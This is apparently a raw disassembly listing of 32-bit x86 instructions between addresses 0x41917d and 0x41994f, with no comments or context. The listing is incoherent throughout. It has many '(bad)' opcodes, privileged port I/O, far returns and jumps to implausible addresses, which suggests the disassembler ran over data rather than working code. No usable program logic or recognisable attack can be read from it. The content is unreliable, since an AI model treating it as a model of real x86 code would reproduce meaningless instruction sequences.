  41917d:	and    al,0x7
  41917f:	adc    edx,DWORD PTR [edi+0x26]
  419182:	out    0x78,eax
  419184:	lods   eax,DWORD PTR ds:[esi]
  419185:	(bad)  
  419186:	test   al,0xa2
  419188:	xor    dh,BYTE PTR [bx+si]
  41918b:	rcl    DWORD PTR [edi-0x72],1
  41918e:	gs loope 0x419180
  419191:	pop    eax
  419192:	xchg   edi,eax
  419193:	(bad)  
  419194:	cmp    al,0xd2
  419196:	pusha  
  419197:	rol    DWORD PTR [edx-0x4f],cl
  41919a:	push   0x63b3cacf
  41919f:	mov    esi,0xc28ef1ef
  4191a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a5:	push   esi
  4191a6:	mov    edx,0xff481fdb
  4191ab:	int3   
  4191ac:	mov    edi,0x92b48aaa
  4191b1:	add    al,0x4
  4191b3:	sahf   
  4191b4:	ds push edi
  4191b6:	mov    ?,WORD PTR [ecx-0x38]
  4191b9:	add    BYTE PTR [edx],dl
  4191bb:	dec    esp
  4191bc:	nop
  4191bd:	out    dx,al
  4191be:	(bad)  
  4191bf:	jmp    0x3fb79897
  4191c4:	jmp    0x81227077
  4191c9:	push   ds
  4191ca:	sbb    al,0xab
  4191cc:	test   eax,0xd3653d7b
  4191d1:	in     al,0xa6
  4191d3:	(bad)  
  4191d5:	fs pop esi
  4191d7:	ret    
  4191d8:	sub    eax,0xa1bd27bd
  4191dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191de:	bound  ecx,QWORD PTR [ecx]
  4191e0:	mov    ch,0x10
  4191e2:	cmp    esi,ebp
  4191e4:	mov    ebx,0x7102fc45
  4191e9:	data16 imul BYTE PTR [edx-0x47]
  4191ed:	adc    DWORD PTR [ebx+0x69],ebx
  4191f0:	clc    
  4191f1:	ins    BYTE PTR es:[edi],dx
  4191f2:	mov    eax,0xd7ae2810
  4191f7:	mov    WORD PTR [edi+0x4b],es
  4191fa:	mov    ax,ds:0x6ef7eeb7
  419200:	jle    0x4191a9
  419202:	and    esi,DWORD PTR [ebx-0x5a]
  419205:	iret   
  419206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419207:	lods   al,BYTE PTR ds:[esi]
  419208:	sbb    al,0x1e
  41920a:	outs   dx,DWORD PTR ds:[esi]
  41920b:	xchg   ecx,eax
  41920c:	mov    dh,0x93
  41920e:	add    eax,ecx
  419210:	mov    ebx,0x450471e9
  419215:	ret    0xeb43
  419218:	mov    ebp,0x1f2b16b2
  41921d:	stc    
  41921e:	jp     0x4191e8
  419220:	jp     0x419284
  419222:	(bad)  
  419224:	and    al,0x86
  419226:	dec    esi
  419227:	inc    edx
  419228:	push   ss
  419229:	cmp    al,0x1a
  41922b:	je     0x41926d
  41922d:	mov    bl,0xf4
  41922f:	(bad)  
  419230:	and    al,0x80
  419232:	int    0x8d
  419234:	daa    
  419235:	int    0xf
  419237:	sub    bl,BYTE PTR [ecx+0x263977a1]
  41923d:	xchg   DWORD PTR [ecx-0x2a686b03],ecx
  419243:	or     al,BYTE PTR [edi]
  419245:	adc    al,0x4d
  419247:	or     DWORD PTR [ebx-0x1d],ecx
  41924a:	sbb    al,0x84
  41924c:	ret    
  41924d:	int    0xea
  41924f:	popa   
  419250:	(bad)  
  419251:	(bad)  
  419252:	mov    ebx,0x912c49d8
  419257:	pusha  
  419258:	jne    0x41921c
  41925a:	jb     0x4192b8
  41925c:	push   ebp
  41925d:	mov    cl,0xde
  41925f:	mov    ds:0xf715ca0d,eax
  419264:	push   ds
  419265:	and    eax,0xf2dea7d2
  41926a:	sti    
  41926b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41926c:	cld    
  41926d:	std    
  41926e:	fst    st(6)
  419270:	adc    ebx,DWORD PTR [ebp-0x60]
  419273:	dec    ebp
  419274:	push   edx
  419275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419276:	xchg   ecx,eax
  419277:	retf   
  419278:	xor    ebp,DWORD PTR [ebx+0x4bad939a]
  41927e:	in     al,dx
  41927f:	push   0x33
  419281:	cli    
  419282:	mov    DWORD PTR [ebx+0x16da8137],edi
  419288:	sahf   
  419289:	ret    
  41928a:	mov    BYTE PTR [edx],al
  41928c:	rcl    DWORD PTR [eax-0x1b04ad1f],1
  419292:	out    dx,eax
  419293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419294:	xchg   ecx,eax
  419295:	jecxz  0x419313
  419297:	jae    0x419278
  419299:	sti    
  41929a:	xchg   al,bl
  41929c:	jp     0x4192ae
  41929e:	inc    ebx
  41929f:	aaa    
  4192a0:	ss pop ebp
  4192a2:	aam    0x8
  4192a4:	pop    esi
  4192a5:	out    0xa8,al
  4192a7:	in     eax,dx
  4192a8:	dec    edi
  4192a9:	jb     0x41931e
  4192ab:	push   esi
  4192ac:	dec    dl
  4192ae:	pop    ds
  4192af:	pop    ss
  4192b0:	push   esp
  4192b1:	ds retf 
  4192b3:	fcomp  DWORD PTR es:[ebx-0x1]
  4192b7:	and    DWORD PTR [ecx],0xffffff86
  4192ba:	mov    al,0x58
  4192bc:	jns    0x41924d
  4192be:	and    DWORD PTR ss:[esi-0x38],ebx
  4192c2:	cmpxchg ch,cl
  4192c5:	fst    DWORD PTR [edx-0x6e]
  4192c8:	xor    bh,ch
  4192ca:	inc    edi
  4192cb:	dec    edi
  4192cc:	pushf  
  4192cd:	fsub   DWORD PTR [edx+0x61b3cd42]
  4192d3:	arpl   si,dx
  4192d5:	les    ecx,FWORD PTR [ebx+0x2f]
  4192d8:	xor    esp,edx
  4192da:	dec    ecx
  4192db:	arpl   WORD PTR [eax-0x23df607f],bx
  4192e1:	pop    edi
  4192e2:	rcr    BYTE PTR [ecx+0x5d],cl
  4192e5:	and    edx,0xffffff80
  4192e8:	push   eax
  4192e9:	cmp    BYTE PTR [ebp+0x1],dh
  4192ec:	out    dx,eax
  4192ed:	jo     0x4192ef
  4192ef:	add    BYTE PTR [eax],al
  4192f1:	add    BYTE PTR [ebp+0xe],al
  4192f4:	retf   0xcb6c
  4192f7:	in     al,dx
  4192f8:	out    0x2f,eax
  4192fa:	dec    ecx
  4192fb:	add    eax,0x5c415d81
  419300:	cdq    
  419301:	add    ebp,ecx
  419303:	sgdtd  [eax]
  419306:	hlt    
  419307:	add    al,0x0
  419309:	add    al,al
  41930b:	mov    edi,0x398447d3
  419310:	adc    ebp,DWORD PTR [ebx-0x2c]
  419313:	mov    dh,dl
  419315:	push   0x3
  419317:	sub    bl,BYTE PTR [edx+eax*4+0x3b1e1f48]
  41931e:	out    dx,al
  41931f:	dec    ecx
  419320:	inc    edi
  419321:	(bad)  
  419322:	adc    esi,DWORD PTR [eax+0x60b20cfb]
  419328:	xchg   esi,eax
  419329:	xor    DWORD PTR [edi],edi
  41932b:	adc    BYTE PTR [esi+0x38881adc],0xcf
  419332:	jle    0x41938e
  419334:	sbb    esi,ecx
  419336:	lahf   
  419337:	add    DWORD PTR [esp+esi*8-0x25eb3a4f],esi
  41933e:	loope  0x4193bf
  419340:	popa   
  419341:	sub    BYTE PTR fs:[eax],dl
  419344:	(bad)
  419348:	jno    0x419338
  41934a:	or     DWORD PTR [ebp-0x2],ebp
  41934d:	mov    ds:0xc0b7a5e6,eax
  419352:	jecxz  0x41938c
  419354:	mov    ebp,0xa801ee73
  419359:	dec    edx
  41935a:	jmp    0x27bc7db6
  41935f:	cmp    eax,0x34709431
  419364:	cmp    BYTE PTR [edi+0x385aa334],cl
  41936a:	inc    esp
  41936b:	jbe    0x4193af
  41936d:	adc    eax,DWORD PTR [ebp-0x7cbe3da8]
  419373:	mov    bl,0x96
  419375:	dec    edi
  419376:	jg     0x419337
  419378:	adc    BYTE PTR [edx],0x13
  41937b:	xchg   DWORD PTR [edx+0x19757883],eax
  419381:	(bad)  
  419382:	dec    DWORD PTR [edx+0x12964e9d]
  419388:	pop    esi
  419389:	sub    BYTE PTR [esi+0x7d],al
  41938c:	inc    edi
  41938d:	xlat   BYTE PTR es:[ebx]
  41938f:	mov    ds:0x4d78aeea,eax
  419394:	fwait
  419395:	push   eax
  419396:	inc    BYTE PTR [esi+0x7e]
  419399:	pop    edx
  41939a:	xor    ebp,esi
  41939c:	mov    ecx,0x5e9b1039
  4193a1:	add    BYTE PTR [ecx+0x77],0x72
  4193a5:	push   sp
  4193a7:	or     al,0x22
  4193a9:	xor    BYTE PTR [bp+si+0x6],cl
  4193ad:	mov    ds:0x9cfd1d17,al
  4193b2:	add    eax,0x8789b2c6
  4193b7:	jo     0x41935f
  4193b9:	jle    0x419401
  4193bb:	je     0x41940b
  4193bd:	pop    DWORD PTR [ecx+0x7bafd7c5]
  4193c3:	fxam   
  4193c5:	out    dx,al
  4193c6:	fs cmp al,dh
  4193c9:	inc    edi
  4193ca:	fcomp  DWORD PTR [edx]
  4193cc:	inc    ecx
  4193cd:	push   edi
  4193ce:	scas   al,BYTE PTR es:[edi]
  4193cf:	nop
  4193d0:	mov    ds:0x8e5cb23e,eax
  4193d5:	aam    0xd2
  4193d7:	repnz mov al,ds:0xfb7793a7
  4193dd:	add    dh,bl
  4193df:	adc    DWORD PTR [ecx+ebp*2+0x29],edi
  4193e3:	adc    eax,0xbddcfb21
  4193e8:	inc    ebp
  4193e9:	ja     0x419385
  4193eb:	into   
  4193ec:	cld    
  4193ed:	pop    ss
  4193ee:	out    dx,eax
  4193ef:	pop    ss
  4193f0:	jg     0x419436
  4193f2:	(bad)  
  4193f3:	in     al,dx
  4193f4:	adc    eax,0x6755610d
  4193f9:	inc    ecx
  4193fa:	dec    edi
  4193fb:	add    ah,BYTE PTR [ebx-0x7c845df4]
  419401:	lds    ebp,FWORD PTR [esi+0x40]
  419404:	sbb    al,0x72
  419406:	sbb    edi,esi
  419408:	(bad)
  41940c:	dec    esp
  41940d:	push   ecx
  41940e:	fcom   DWORD PTR ds:0x6bb169d4
  419414:	ins    BYTE PTR es:[edi],dx
  419415:	or     eax,0xb5926b6e
  41941a:	sub    ch,al
  41941c:	mov    DWORD PTR [ecx+ebx*1],0x3286fb4a
  419423:	mov    eax,ds:0x27ec9919
  419428:	lea    ebp,[esi+0x7a5d0305]
  41942e:	xor    edx,ecx
  419430:	(bad)
  419433:	inc    esp
  419434:	and    BYTE PTR [edx-0x8e72091],ch
  41943a:	sub    eax,0x32f559f9
  41943f:	outs   dx,DWORD PTR ds:[esi]
  419440:	lea    ebp,[ebp-0x78]
  419443:	les    esp,FWORD PTR [ebp-0x2b]
  419446:	out    dx,al
  419447:	xchg   esi,eax
  419448:	pop    edx
  419449:	sbb    ah,BYTE PTR [edi]
  41944b:	mov    al,0x1f
  41944d:	mov    edi,0xd72212c3
  419452:	in     eax,0x56
  419454:	ror    BYTE PTR [eax-0x7f9cfbf1],0x18
  41945b:	xchg   edx,eax
  41945c:	sub    cl,BYTE PTR [ebx]
  41945e:	xor    edx,DWORD PTR [esi-0x5f925823]
  419464:	cmp    al,0x70
  419466:	pop    ebx
  419467:	or     ecx,esp
  419469:	mov    esi,0x713edacb
  41946e:	shl    ebx,0x37
  419471:	mov    ebp,0x961af12c
  419476:	in     eax,0x88
  419478:	mov    ds:0x2bb6cd9a,al
  41947d:	cmp    edi,DWORD PTR [esi]
  41947f:	inc    esi
  419480:	ins    BYTE PTR es:[edi],dx
  419481:	fdiv   DWORD PTR [ebx]
  419483:	out    dx,eax
  419484:	shl    DWORD PTR [ecx],cl
  419486:	push   0xc5c2b5d9
  41948b:	in     eax,dx
  41948c:	fs push cs
  41948e:	fist   DWORD PTR [edx-0x1fe0883]
  419494:	ss dec ebp
  419496:	push   ss
  419497:	sbb    esi,DWORD PTR [eax-0x383ea6f3]
  41949d:	dec    edi
  41949e:	fisubr WORD PTR [di-0x257e]
  4194a3:	call   0x45f19139
  4194a8:	(bad)  
  4194a9:	pop    ebp
  4194aa:	and    ebx,DWORD PTR [esi+edx*8+0x4120ee39]
  4194b1:	test   bl,cl
  4194b3:	lahf   
  4194b4:	push   edx
  4194b5:	inc    eax
  4194b6:	(bad)  
  4194b7:	std    
  4194b8:	imul   eax,DWORD PTR [ebp-0x6b61f4a7],0xfffffff5
  4194bf:	push   ebx
  4194c0:	push   es
  4194c1:	test   al,0x74
  4194c3:	sub    eax,DWORD PTR [edx]
  4194c5:	gs out 0x54,eax
  4194c8:	cmp    DWORD PTR [ebp+0x5556522c],ecx
  4194ce:	pop    ebp
  4194cf:	xor    eax,0x947a8b07
  4194d4:	push   esi
  4194d5:	popa   
  4194d6:	mov    DWORD PTR [esi],esi
  4194d8:	jo     0x419518
  4194da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194db:	into   
  4194dc:	aas    
  4194dd:	jge    0x419550
  4194df:	push   ss
  4194e0:	jmp    0x4194ca
  4194e2:	mov    ds:0xef3b7994,eax
  4194e7:	pop    ecx
  4194e8:	scas   eax,DWORD PTR es:[edi]
  4194e9:	jbe    0x419493
  4194eb:	adc    BYTE PTR [edi-0x16],0xed
  4194ef:	sub    cl,BYTE PTR [ebp+0x14a844d2]
  4194f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f6:	adc    DWORD PTR [ecx+0x7d],edx
  4194f9:	and    cl,dh
  4194fb:	add    al,0xd6
  4194fd:	cmp    ebx,DWORD PTR [eax-0x2]
  419500:	leave  
  419501:	aam    0x57
  419503:	inc    ecx
  419504:	rcl    ebp,1
  419506:	cmp    edi,DWORD PTR [edi]
  419508:	dec    ebp
  419509:	outs   dx,DWORD PTR ds:[esi]
  41950a:	add    DWORD PTR [edx+ecx*8-0x54f72661],ebx
  419511:	jp     0x41951f
  419513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419514:	addr16 popf 
  419516:	sbb    al,0x16
  419518:	out    dx,eax
  419519:	fneni(8087 only) 
  41951b:	pop    eax
  41951c:	in     al,0xdf
  41951e:	mov    esp,0xae3ed140
  419523:	jno    0x4194b9
  419525:	imul   ebx,DWORD PTR [esi-0x15],0xc1037bd0
  41952c:	jp     0x4194f0
  41952e:	mov    eax,0xc0df70e5
  419533:	(bad)  
  419534:	mov    edi,0x7c1809dc
  419539:	daa    
  41953a:	xchg   edi,eax
  41953b:	sbb    ebp,DWORD PTR [ebx]
  41953d:	mov    cl,0x93
  41953f:	sbb    BYTE PTR [edi+edi*8-0x344a9d95],cl
  419546:	stos   DWORD PTR es:[edi],eax
  419547:	mov    ebx,0x1a93a5c
  41954c:	pushf  
  41954d:	xchg   ecx,eax
  41954e:	(bad)  
  41954f:	aad    0xe
  419551:	pop    esi
  419552:	jle    0x41951e
  419554:	cld    
  419555:	mov    esp,0xc7333dfd
  41955a:	sub    eax,0xe9539768
  41955f:	jns    0x41950d
  419561:	pop    eax
  419562:	cmp    BYTE PTR [edi-0x5],0x2b
  419566:	pause  
  419568:	and    BYTE PTR [ebp-0x791197d5],cl
  41956e:	inc    BYTE PTR [eax*8-0x59502c4b]
  419575:	shl    BYTE PTR [esi],0x2b
  419578:	(bad)  
  41957a:	xchg   esi,eax
  41957b:	(bad)  
  41957c:	(bad)  [edi+0x15]
  41957f:	hlt    
  419580:	(bad)  
  419581:	cmp    al,0x82
  419583:	xchg   ecx,eax
  419584:	neg    BYTE PTR [eax-0x13]
  419587:	push   esi
  419588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419589:	ins    BYTE PTR es:[edi],dx
  41958a:	sbb    eax,0xa0918c71
  41958f:	xor    BYTE PTR cs:[edx],bh
  419592:	cdq    
  419593:	xor    eax,0x603bb556
  419598:	xor    dh,dh
  41959a:	push   0x2b418bc6
  41959f:	mov    al,0xc4
  4195a1:	dec    edi
  4195a2:	mov    dl,0x5e
  4195a4:	push   edx
  4195a5:	jno    0x419603
  4195a7:	es mov ah,0xda
  4195aa:	mov    ecx,0x32fb911e
  4195af:	add    al,0x71
  4195b1:	retf   
  4195b2:	idiv   BYTE PTR [esi+0x39]
  4195b5:	sub    al,0x58
  4195b7:	sti    
  4195b8:	add    DWORD PTR [ecx+0x6f],eax
  4195bb:	out    dx,al
  4195bc:	sbb    DWORD PTR [edx],edi
  4195be:	arpl   WORD PTR [ebx-0x2f],si
  4195c1:	jecxz  0x4195ae
  4195c3:	sbb    al,0xcc
  4195c5:	popf   
  4195c6:	ss cwde 
  4195c8:	sbb    al,0xe5
  4195ca:	cli    
  4195cb:	dec    edx
  4195cc:	aaa    
  4195cd:	mov    eax,ds:0x5171da4a
  4195d2:	leave  
  4195d3:	or     edi,DWORD PTR [eax+0x5e]
  4195d6:	sub    al,0x5e
  4195d8:	stos   BYTE PTR es:[edi],al
  4195d9:	ds pop edx
  4195db:	sbb    esi,DWORD PTR [eax]
  4195dd:	rol    dl,cl
  4195df:	jge    0x419621
  4195e1:	pushf  
  4195e2:	push   ds
  4195e3:	jecxz  0x419633
  4195e5:	ss stos BYTE PTR es:[edi],al
  4195e7:	mov    ds:0x23737539,eax
  4195ec:	in     eax,dx
  4195ed:	stos   DWORD PTR es:[edi],eax
  4195ee:	in     al,dx
  4195ef:	lea    esi,[ebx+0x7b]
  4195f2:	sbb    edx,ebx
  4195f4:	rcl    BYTE PTR ss:[eax+0x50c64e65],cl
  4195fb:	and    dh,BYTE PTR [ebx-0x58]
  4195fe:	in     eax,0x39
  419600:	push   eax
  419601:	in     eax,dx
  419602:	into   
  419603:	ds jae 0x4195bf
  419606:	repnz out dx,eax
  419608:	in     al,dx
  419609:	rol    ebx,0xc3
  41960c:	jne    0x4195fd
  41960e:	or     BYTE PTR [edi+edi*8-0x47],0x4a
  419613:	inc    edx
  419614:	adc    eax,0xc360fd12
  419619:	inc    BYTE PTR [ebx]
  41961b:	cld    
  41961c:	inc    edx
  41961d:	add    eax,0x9c0c602d
  419622:	or     BYTE PTR [ecx-0x48d2caef],0x56
  419629:	xchg   edx,eax
  41962a:	rcr    DWORD PTR [ebx-0x40da008],0x7b
  419631:	out    0x8a,eax
  419633:	fs in  al,0x4f
  419636:	jg     0x4196a3
  419638:	or     al,dl
  41963a:	enter  0xe643,0x69
  41963e:	or     eax,0xaf71f2bb
  419643:	popf   
  419644:	(bad)  
  419645:	lds    esp,FWORD PTR [ecx+ecx*8-0xc]
  419649:	push   0x69
  41964b:	push   esi
  41964c:	add    esp,0xc2887c8d
  419652:	or     eax,DWORD PTR [edx-0x236f61c9]
  419658:	popa   
  419659:	add    ah,BYTE PTR [ebp+0x12292846]
  41965f:	dec    ebp
  419660:	jp     0x41961c
  419662:	mov    ah,0x3c
  419664:	icebp  
  419665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419666:	or     al,0xbc
  419668:	nop
  419669:	inc    ebp
  41966a:	cmp    eax,0x492a879d
  41966f:	dec    ecx
  419670:	or     edx,DWORD PTR [edi-0x31d8bd3]
  419676:	and    DWORD PTR [edi-0x31423807],0xffffffcc
  41967d:	imul   esi,ebp,0x43
  419680:	fs popf 
  419682:	xor    eax,0xb6fc47f9
  419687:	xchg   ebp,eax
  419688:	fwait
  419689:	je     0x419637
  41968b:	dec    esi
  41968c:	jbe    0x419620
  41968e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968f:	jo     0x419677
  419691:	xor    BYTE PTR [ecx],dl
  419693:	imul   esp,ebx,0xd36ca9ce
  419699:	pop    edi
  41969a:	(bad)  
  41969b:	jp     0x419691
  41969d:	dec    ebp
  41969e:	in     al,0xc6
  4196a0:	push   ss
  4196a1:	arpl   WORD PTR [ebx],bp
  4196a3:	int    0xee
  4196a5:	push   cs
  4196a6:	push   es
  4196a7:	or     bh,BYTE PTR [esi-0x21e8dc60]
  4196ad:	xor    eax,0xb77311b3
  4196b2:	mov    ds:0x147b8312,al
  4196b7:	jl     0x41972c
  4196b9:	rcr    DWORD PTR [edi+edi*1-0xdcea3f5],1
  4196c0:	and    DWORD PTR [esi],ebp
  4196c2:	stos   DWORD PTR es:[edi],eax
  4196c3:	xor    al,0x7a
  4196c5:	dec    ecx
  4196c6:	push   ecx
  4196c7:	loopne 0x41973e
  4196c9:	jmp    0x19b76641
  4196ce:	repnz in eax,0xb
  4196d1:	lock xor DWORD PTR [ebp+0x58],0xffffffe3
  4196d6:	call   0xdf250a8c
  4196db:	add    DWORD PTR [esi+0x0],eax
  4196de:	jle    0x419696
  4196e0:	ficomp WORD PTR ds:0xa16c5b01
  4196e6:	xchg   ebp,eax
  4196e7:	mov    edx,0x85517aca
  4196ec:	adc    DWORD PTR [ebx+0x505f3227],0x16bac32a
  4196f6:	xor    al,0x9
  4196f8:	sub    dl,ch
  4196fa:	test   edi,ecx
  4196fc:	push   ds
  4196fd:	scas   eax,DWORD PTR es:[edi]
  4196fe:	or     bl,dh
  419700:	adc    al,0x88
  419702:	mov    bl,0xe
  419704:	jmp    0x5406dd34
  419709:	sub    DWORD PTR [ecx-0x1ca24ac2],esp
  41970f:	cld    
  419710:	xchg   edx,eax
  419711:	mov    edx,0x13632b4f
  419716:	adc    esp,ebx
  419718:	lahf   
  419719:	push   cs
  41971a:	jns    0x4196e3
  41971c:	push   cs
  41971d:	ret    0xf469
  419720:	pop    edi
  419721:	iret   
  419722:	call   0x4687b17a
  419727:	fld    QWORD PTR [ebx+0x50db4f4e]
  41972d:	inc    edi
  41972e:	lods   eax,DWORD PTR ds:[esi]
  41972f:	out    0x1a,eax
  419731:	xor    DWORD PTR [ebx+0x403453de],esp
  419737:	jns    0x419780
  419739:	fnstsw WORD PTR ds:[eax-0x4e3d7c4a]
  419740:	hlt    
  419741:	xchg   ebp,eax
  419742:	push   edx
  419743:	ja     0x41973f
  419745:	pushf  
  419746:	cmp    BYTE PTR [ebx+edi*2],ah
  419749:	fcmovnbe st,st(3)
  41974b:	clc    
  41974c:	loopne 0x419710
  41974e:	(bad)  
  419750:	loope  0x419725
  419752:	pop    ss
  419753:	jne    0x41972f
  419755:	or     BYTE PTR [ebx-0x2f],0xad
  419759:	int3   
  41975a:	cld    
  41975b:	dec    esi
  41975c:	shr    ecx,0x13
  41975f:	mov    BYTE PTR [ebx-0x34],0x8e
  419763:	adc    ecx,0xffffffa3
  419766:	pop    esi
  419767:	pop    ebp
  419768:	aaa    
  419769:	aad    0x6d
  41976b:	jns    0x4197ac
  41976d:	push   0x53
  41976f:	inc    eax
  419770:	mov    bh,0x3e
  419772:	adc    DWORD PTR [ebx-0x39],0xffffffe8
  419776:	jnp    0x419711
  419778:	push   0xe05ee56d
  41977d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41977e:	mov    dh,0x10
  419780:	dec    ecx
  419781:	(bad)
  419784:	push   ebp
  419785:	dec    BYTE PTR [edx*2-0x16ff4fbc]
  41978c:	mov    DWORD PTR [ecx],ebp
  41978e:	adc    DWORD PTR [ebx+0x241a9860],eax
  419794:	push   ss
  419795:	inc    edx
  419796:	and    al,0xe
  419798:	add    eax,0x8fcafef5
  41979d:	xchg   esi,eax
  41979e:	scas   al,BYTE PTR es:[edi]
  41979f:	sub    cl,cl
  4197a1:	xchg   DWORD PTR [esi+esi*8-0x56],esp
  4197a5:	add    eax,0x503e5337
  4197aa:	les    edx,FWORD PTR [eax+0x5510bffd]
  4197b0:	adc    eax,0x1744c708
  4197b5:	mov    DWORD PTR [ebx+0x4355f3e9],esi
  4197bb:	retf   
  4197bc:	mov    cl,0x98
  4197be:	mov    cl,0x7a
  4197c0:	int    0xf
  4197c2:	adc    bh,BYTE PTR [edi-0x6dc5aa00]
  4197c8:	stc    
  4197c9:	ret    0x88d8
  4197cc:	xchg   BYTE PTR [edi+0xb],ah
  4197cf:	push   cs
  4197d0:	sub    eax,DWORD PTR [esi-0x37]
  4197d3:	mov    eax,0x8ae3d988
  4197d8:	ror    DWORD PTR [ebp+0x71],0x21
  4197dc:	in     al,0xe8
  4197de:	in     al,0x68
  4197e0:	mov    es,WORD PTR fs:[ebx-0x2f5dcd9d]
  4197e7:	call   DWORD PTR [ebx-0x6d]
  4197ea:	jnp    0x419853
  4197ec:	idiv   BYTE PTR [ebx+0x69]
  4197ef:	out    dx,al
  4197f0:	aas    
  4197f1:	out    dx,eax
  4197f2:	xor    DWORD PTR [eax-0x662b5c5],edx
  4197f8:	jecxz  0x4197d2
  4197fa:	retf   0x879
  4197fd:	adc    al,0x0
  4197ff:	add    BYTE PTR [eax],al
  419801:	add    BYTE PTR [ecx+ebp*8],dl
  419804:	je     0x41982a
  419806:	std    
  419807:	mov    ebp,0x2ac7f954
  41980c:	(bad)  
  41980d:	ror    BYTE PTR [edi-0x22925b39],1
  419813:	adc    al,0x1
  419815:	add    ah,dh
  419817:	add    al,0x0
  419819:	add    dh,dh
  41981b:	sub    dl,dl
  41981d:	push   ss
  41981e:	push   edi
  41981f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419821:	shr    DWORD PTR [esi+0x148a5272],0xbd
  419828:	call   DWORD PTR [ecx-0x7b6c5d11]
  41982e:	stc    
  41982f:	ins    DWORD PTR es:[edi],dx
  419830:	push   0xffffff99
  419832:	ss sub al,0xc5
  419835:	inc    ebx
  419836:	fimul  WORD PTR [ebx]
  419838:	jne    0x419830
  41983a:	sub    DWORD PTR [esi+0x58],esi
  41983d:	push   0x3008a793
  419842:	mov    bh,0xf1
  419844:	out    dx,eax
  419845:	call   0xdd277790
  41984a:	xor    al,0xbd
  41984c:	add    DWORD PTR [ebp+eax*1+0x967848d],esp
  419853:	sahf   
  419854:	and    al,0xe0
  419856:	xor    al,0x54
  419858:	xlat   BYTE PTR ds:[ebx]
  419859:	pop    esi
  41985a:	ja     0x41982a
  41985c:	test   eax,0x424f29b9
  419861:	hlt    
  419862:	cli    
  419863:	(bad)  [ebp-0x17f3e101]
  419869:	jp     0x4198c3
  41986b:	mov    ebx,0x97785600
  419870:	rcr    BYTE PTR [eax+0x2b620508],0xc6
  419877:	les    edi,FWORD PTR [ebp+0x6c9ba549]
  41987d:	sbb    al,0x8e
  41987f:	inc    edx
  419880:	sbb    DWORD PTR [esi-0x4],esp
  419883:	fsub   QWORD PTR [ebp+0x842d8c8]
  419889:	dec    edi
  41988a:	outs   dx,DWORD PTR ds:[esi]
  41988b:	mov    ecx,0xb9122858
  419890:	push   ss
  419891:	lods   al,BYTE PTR ds:[esi]
  419892:	pop    esi
  419893:	sbb    edi,DWORD PTR [esi-0x4a]
  419896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419897:	jmp    0xcbb1b379
  41989c:	or     edx,DWORD PTR [edi-0x1b]
  41989f:	jo     0x41985b
  4198a1:	mov    edi,0x4e640f55
  4198a6:	cmp    dh,al
  4198a8:	ds mov bh,0xaf
  4198ab:	in     al,dx
  4198ac:	xchg   edi,eax
  4198ad:	(bad)  
  4198ae:	fmul   DWORD PTR [esi+0x4f83dfea]
  4198b4:	div    DWORD PTR [edi]
  4198b6:	sub    al,0x44
  4198b8:	dec    ecx
  4198b9:	mov    dl,0xa
  4198bb:	or     BYTE PTR [edi],dh
  4198bd:	xor    eax,0x5cd50b17
  4198c2:	repz in al,0xa1
  4198c5:	out    0xb2,eax
  4198c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c8:	dec    eax
  4198c9:	out    0x3e,al
  4198cb:	inc    ebx
  4198cc:	aad    0x28
  4198ce:	mov    ds:0xc6372b71,eax
  4198d3:	mov    cl,0xd
  4198d5:	rcl    bh,cl
  4198d7:	dec    ebp
  4198d8:	jns    0x419946
  4198da:	and    esp,ecx
  4198dc:	push   0x59
  4198de:	mov    DWORD PTR [ebp+0x41],ebx
  4198e1:	inc    eax
  4198e2:	stos   BYTE PTR es:[edi],al
  4198e3:	push   esi
  4198e4:	sub    edi,edx
  4198e6:	ins    BYTE PTR es:[edi],dx
  4198e7:	stc    
  4198e8:	(bad)  
  4198e9:	fwait
  4198ea:	pop    ecx
  4198eb:	dec    ebx
  4198ec:	sub    bl,cl
  4198ee:	sti    
  4198ef:	jb     0x41990f
  4198f1:	nop
  4198f2:	ret    
  4198f3:	imul   ecx,DWORD PTR [esi-0x4a],0xa2d0c67b
  4198fa:	and    ch,BYTE PTR fs:[edx+0x69]
  4198fe:	sub    BYTE PTR [edi],ah
  419900:	push   0x34
  419902:	xor    ecx,ebp
  419904:	jl     0x419911
  419906:	div    DWORD PTR [si-0x39]
  41990a:	stos   BYTE PTR es:[edi],al
  41990b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41990c:	add    BYTE PTR [ecx+0x64],dl
  41990f:	cwde   
  419910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419911:	jne    0x41990a
  419913:	fbld   TBYTE PTR [eax-0x51]
  419916:	fs jae 0x419963
  419919:	lock mov ebp,0x2cc13bb3
  41991f:	not    DWORD PTR [eax+edi*8]
  419922:	leave  
  419923:	daa    
  419924:	adc    ah,bl
  419926:	es xchg esi,eax
  419928:	ins    BYTE PTR es:[edi],dx
  419929:	or     BYTE PTR [ebp-0x6c],ah
  41992c:	fadd   DWORD PTR [ecx]
  41992e:	outs   dx,BYTE PTR ds:[esi]
  41992f:	push   ecx
  419930:	lea    ebx,[esi+ebp*1]
  419933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419934:	pop    esp
  419935:	xchg   edi,eax
  419936:	pop    esp
  419937:	add    esp,DWORD PTR [eax]
  419939:	push   0xffffff91
  41993b:	xchg   ebp,eax
  41993c:	cli    
  41993d:	(bad)  
  41993e:	mov    ch,0xc
  419940:	nop
  419941:	dec    ebx
  419942:	mov    al,ds:0xf899365a
  419947:	fimul  DWORD PTR [ecx-0x4d]
  41994a:	(bad)  
  41994b:	ror    DWORD PTR [esi+0x5d],1
  41994e:	dec    eax
  41994f:	es lock repz push eax
